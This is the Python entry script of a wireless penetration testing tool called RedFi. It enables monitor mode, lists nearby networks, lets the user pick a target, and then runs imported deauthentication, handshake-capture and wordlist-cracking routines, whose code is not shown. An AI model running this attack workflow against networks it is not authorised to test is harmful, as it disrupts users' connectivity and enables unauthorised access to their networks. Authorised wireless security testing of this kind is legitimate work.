import argparse
import sys
import os
import subprocess
from core.scanner import scan_networks
from core.attacker import deauth_attack, capture_handshake
from core.cracker import crack_password

def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

def start_monitor_mode(interface):
    """Enables monitor mode and returns the new interface name."""
    print(f"[*] Starting monitor mode on {interface}...")
    subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, text=True)
    mon_proc = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True)
    
    monitor_interface = next((line.split('on ')[-1].split(')')[0] for line in (mon_proc.stdout.splitlines() + mon_proc.stderr.splitlines()) if 'monitor mode enabled on' in line), None)
    
    if not monitor_interface:
        print(f"[!] Could not determine monitor interface name. Using default '{interface}mon'.")
        monitor_interface = interface + 'mon'

    # Verify monitor mode is active
    check_proc = subprocess.run(['iwconfig', monitor_interface], capture_output=True, text=True)
    if 'Mode:Monitor' not in check_proc.stdout:
        print(f"[!] Failed to enable monitor mode on {monitor_interface}. Exiting.")
        return None

    print(f"[*] Monitor mode enabled on {monitor_interface}")
    return monitor_interface

def stop_monitor_mode(interface):
    """Disables monitor mode."""
    if interface:
        print(f"[*] Stopping monitor mode on {interface}...")
        subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, text=True)

def main():
    check_root()

    parser = argparse.ArgumentParser(description="RedFi - A new penetration testing tool for wireless networks.")
    parser.add_argument("-i", "--interface", help="The wireless interface to use.", required=True)
    parser.add_argument("-a", "--attack", help="The attack to use.", choices=["deauth", "pmkid"], default="deauth")
    parser.add_argument("-c", "--count", help="The number of deauthentication packets to send.", type=int, default=10)
    parser.add_argument("-w", "--wordlist", help="The wordlist to use for cracking the password.", required=True)
    args = parser.parse_args()

    monitor_interface = None
    try:
        monitor_interface = start_monitor_mode(args.interface)
        if not monitor_interface:
            sys.exit(1)

        networks = scan_networks(monitor_interface)
        if not networks:
            print("[!] No networks found. Exiting.")
            sys.exit(1)

        print("\nAvailable networks:")
        for i, network in enumerate(networks):
            print(f"{i+1}: {network['ssid']} ({network['bssid']})")

        while True:
            try:
                choice = int(input("Select a target: "))
                if 1 <= choice <= len(networks):
                    target = networks[choice-1]
                    if args.attack == "deauth":
                        # Use the monitor interface for the attack
                        deauth_attack(target, monitor_interface, args.count)
                        capture_handshake(target, monitor_interface)
                        crack_password(args.wordlist)
                    elif args.attack == "pmkid":
                        # capture_pmkid(target, monitor_interface)
                        print("PMKID attack not yet implemented.")
                    break
                else:
                    print("Invalid choice.")
            except (ValueError, EOFError):
                print("Invalid choice.")
                break

    except KeyboardInterrupt:
        print("\n[!] User interrupted. Cleaning up...")
    finally:
        if monitor_interface:
            stop_monitor_mode(monitor_interface)

if __name__ == "__main__":
    main()